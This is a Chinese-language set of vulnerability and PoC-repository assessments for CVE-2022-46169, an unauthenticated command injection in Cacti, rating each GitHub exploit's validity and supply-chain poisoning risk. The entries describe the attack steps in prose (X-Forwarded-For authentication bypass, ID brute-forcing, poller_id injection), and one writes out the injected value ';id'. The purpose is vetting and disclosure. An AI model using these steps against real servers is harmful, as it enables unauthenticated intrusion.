**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

